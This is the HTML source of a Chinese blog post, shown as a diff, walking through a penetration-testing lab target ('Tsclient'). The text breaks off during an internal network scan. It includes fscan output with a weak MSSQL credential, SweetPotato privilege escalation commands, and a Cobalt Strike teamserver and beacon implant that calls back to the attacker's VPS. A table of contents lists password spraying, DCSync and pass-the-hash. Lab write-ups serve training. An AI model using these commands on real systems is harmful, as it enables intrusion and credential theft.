@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="考点 mssql弱口令 SweetPotato提权 CS注入在线用户进程上线 共享文件 CS不出网转发上线 映像劫持提权(放大镜提权) Dcsync  flag1常规扫端口 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647root@VM-16-12-ubuntu:&#x2F;var&#x2F;w">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜Tsclient">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="考点 mssql弱口令 SweetPotato提权 CS注入在线用户进程上线 共享文件 CS不出网转发上线 映像劫持提权(放大镜提权) Dcsync  flag1常规扫端口 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647root@VM-16-12-ubuntu:&#x2F;var&#x2F;w">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105184121311.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105193637941.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105193756769.png">
+<meta property="og:image" content="https://wanth3f1ag.top/2025/11/05/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105194050014.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105195619416.png">
+<meta property="og:image" content="https://wanth3f1ag.top/2025/11/05/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105200501357.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105201045558.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105201409612.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105201810488.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105202036173.png">
+<meta property="og:image" content="https://wanth3f1ag.top/2025/11/05/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105203151410.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105203946686.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105204710271.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105204818354.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105212235948.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105212615929.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105212710218.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105212845379.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105213403604.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105213736342.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105214341195.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105214348717.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105215438357.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105215623785.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105215849348.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105215956222.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105220341598.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105221340485.png">
+<meta property="article:published_time" content="2025-11-05T10:39:27.000Z">
+<meta property="article:modified_time" content="2025-11-05T14:25:05.631Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="Tsclient">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105184121311.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>春秋云镜Tsclient</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/3025/04/16/%E5%AF%B9%E4%BA%8ERCE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E7%82%B9%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/04/ctfshow%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&text=春秋云镜Tsclient"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&is_video=false&description=春秋云镜Tsclient"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云镜Tsclient&body=Check out this article: https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&title=春秋云镜Tsclient"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&name=春秋云镜Tsclient&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/11/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTsclient/&t=春秋云镜Tsclient"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">2.</span> <span class="toc-text">flag1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MDUT%E8%BF%9E%E6%8E%A5%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">MDUT连接数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9C%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">甜土豆提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C2%E4%B8%8A%E7%BA%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">C2上线木马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">内网穿透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">4.</span> <span class="toc-text">flag2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RDP%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.1.</span> <span class="toc-text">RDP添加用户连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">CS进程注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">密码喷洒攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impacket-changepasswd%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81"><span class="toc-number">4.4.</span> <span class="toc-text">impacket-changepasswd修改密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E8%BD%AC%E5%8F%91%E4%B8%8A%E7%BA%BFCS"><span class="toc-number">4.5.</span> <span class="toc-text">不出网转发上线CS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">4.6.</span> <span class="toc-text">进程劫持提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3"><span class="toc-number">5.</span> <span class="toc-text">flag3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92"><span class="toc-number">5.1.</span> <span class="toc-text">哈希传递</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        春秋云镜Tsclient
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-05T10:39:27.000Z" class="dt-published" itemprop="datePublished">2025-11-05</time>
+        
+        (Updated: <time datetime="2025-11-05T14:25:05.631Z" class="dt-updated" itemprop="dateModified">2025-11-05</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/">春秋云镜</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Tsclient/" rel="tag">Tsclient</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105184121311.png" alt="image-20251105184121311"></p>
+<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>mssql弱口令</li>
+<li>SweetPotato提权</li>
+<li>CS注入在线用户进程上线</li>
+<li>共享文件</li>
+<li>CS不出网转发上线</li>
+<li>映像劫持提权(放大镜提权)</li>
+<li>Dcsync</li>
+</ul>
+<h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>常规扫端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-12-ubuntu:/var/www/html# ./fscan -h 39.98.117.55 -p 1-65535</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">39.98.117.55:135 open</span></span><br><span class="line"><span class="string">39.98.117.55:80 open</span></span><br><span class="line"><span class="string">39.98.117.55:139 open</span></span><br><span class="line"><span class="string">39.98.117.55:445 open</span></span><br><span class="line"><span class="string">39.98.117.55:1433 open</span></span><br><span class="line"><span class="string">39.98.117.55:2383 open</span></span><br><span class="line"><span class="string">39.98.117.55:3389 open</span></span><br><span class="line"><span class="string">39.98.117.55:15774 open</span></span><br><span class="line"><span class="string">39.98.117.55:16452 open</span></span><br><span class="line"><span class="string">39.98.117.55:16451 open</span></span><br><span class="line"><span class="string">39.98.117.55:16450 open</span></span><br><span class="line"><span class="string">39.98.117.55:16453 open</span></span><br><span class="line"><span class="string">39.98.117.55:17001 open</span></span><br><span class="line"><span class="string">39.98.117.55:47001 open</span></span><br><span class="line"><span class="string">39.98.117.55:49666 open</span></span><br><span class="line"><span class="string">39.98.117.55:49667 open</span></span><br><span class="line"><span class="string">39.98.117.55:49665 open</span></span><br><span class="line"><span class="string">39.98.117.55:49691 open</span></span><br><span class="line"><span class="string">39.98.117.55:49671 open</span></span><br><span class="line"><span class="string">39.98.117.55:49669 open</span></span><br><span class="line"><span class="string">39.98.117.55:49664 open</span></span><br><span class="line"><span class="string">39.98.117.55:49737 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 22</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]39.98.117.55</span></span><br><span class="line"><span class="string">   [-&gt;]WIN-WEB</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.8.18</span></span><br><span class="line"><span class="string">   [-&gt;]2001:0:348b:fb58:4d3:3124:53e9:f7ed</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.98.117.55:47001 code:404 len:315    title:Not Found</span></span><br><span class="line"><span class="string">[*] WebTitle http://39.98.117.55       code:200 len:703    title:IIS Windows Server</span></span><br><span class="line"><span class="string">[+] mssql 39.98.117.55:1433:sa 1qaz!QAZ</span></span><br><span class="line"><span class="string">已完成 21/22 [-] (52/210) rdp 39.98.117.55:3389 administrator Aa1234 remote error: tls: access denied </span></span><br><span class="line"><span class="string">已完成 21/22 [-] (102/210) rdp 39.98.117.55:3389 admin test remote error: tls: access denied </span></span><br><span class="line"><span class="string">已完成 21/22 [-] (152/210) rdp 39.98.117.55:3389 guest 123 remote error: tls: access denied </span></span><br><span class="line"><span class="string">已完成 21/22 [-] (202/210) rdp 39.98.117.55:3389 guest 1qaz!QAZ remote error: tls: access denied </span></span><br><span class="line"><span class="string">已完成 22/22</span></span><br><span class="line"><span class="string">[*] 扫描结束,耗时: 4m41.597425504s</span></span><br></pre></td></tr></table></figure>
+
+<p>发现有一个mssql弱口令，用MDUT登一下</p>
+<h3 id="MDUT连接数据库"><a href="#MDUT连接数据库" class="headerlink" title="MDUT连接数据库"></a>MDUT连接数据库</h3><p><a target="_blank" rel="noopener" href="https://github.com/SafeGroceryStore/MDUT/releases">https://github.com/SafeGroceryStore/MDUT/releases</a> </p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105193637941.png" alt="image-20251105193637941"></p>
+<p>添加后激活组件并尝试RCE</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105193756769.png" alt="image-20251105193756769"></p>
+<h3 id="甜土豆提权"><a href="#甜土豆提权" class="headerlink" title="甜土豆提权"></a>甜土豆提权</h3><p>但是此时的权限还是比较低的，我们传个甜土豆进行提权 <a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato">https://github.com/uknowsec/SweetPotato</a></p>
+<p>成功上传后利用甜土豆执行命令<code>C:/迅雷下载/SweetPotato.exe -a &quot;whoami&quot;</code></p>
+<p>发现是system，说明提权成功了</p>
+<img src="../image/achieve/202411/春秋云镜/image-20251105194050014.png" alt="image-20251105194050014" style="zoom: 80%;" />
+
+<h3 id="C2上线木马"><a href="#C2上线木马" class="headerlink" title="C2上线木马"></a>C2上线木马</h3><p>为了方便管理，我们上C2 <a target="_blank" rel="noopener" href="https://forum.butian.net/share/523">https://forum.butian.net/share/523</a></p>
+<p>在vps启动服务端teamserver，传入ip地址和密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [vps的ip] <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<p>然后我们主机启动客户端进行连接，用户名是root，密码就是whoami</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105195619416.png" alt="image-20251105195619416"></p>
+<p>然后我们开启一个监听器</p>
+<img src="../image/achieve/202411/春秋云镜/image-20251105200501357.png" alt="image-20251105200501357" style="zoom:80%;" />
+
+<p>生成一个Windows木马<code>beacon.exe</code></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105201045558.png" alt="image-20251105201045558"></p>
+<p>将生成的木马上传后运行<code>C:/迅雷下载/SweetPotato.exe -a &quot;C:/迅雷下载/beacon.exe&quot;</code></p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105201409612.png" alt="image-20251105201409612"></p>
+<p>成功上线，一开始是直接运行木马的，导致用户还是低权限用户，后面换甜土豆运行后就是SYSTEM了</p>
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105201810488.png" alt="image-20251105201810488"></p>
+<p>然后就是读flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">whoami</span></span><br><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\flag\flag01.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/achieve/202411/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/image-20251105202036173.png" alt="image-20251105202036173"></p>
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>用MDUT上传fscan和stowaway，记得给权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/迅雷下载/SweetPotato.exe -a <span class="string">&quot;chmod +x C:/迅雷下载/*&quot;</span></span><br><span class="line">C:/迅雷下载/SweetPotato.exe -a <span class="string">&quot;ifconfig&quot;</span></span><br></pre></td></tr></table></figure>
+
+<img src="../image/achieve/202411/春秋云镜/image-20251105203151410.png" alt="image-20251105203151410" style="zoom:80%;" />
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">C:/迅雷下载/fscan.exe -h 172.22.8.0/24</span><br><span class="line">  ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.15     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.18     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.46     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.8.31     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 4</span></span><br><span class="line"><span class="string">172.22.8.18:1433 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.31:445 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.46:445 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.18:445 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.15:445 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span class="line"><span class="string">172.22.8.31:139 open</span></span><br><span class="line"><span class="string">Open result.txt error, open result.txt: Access is denied.</span></span><br><span 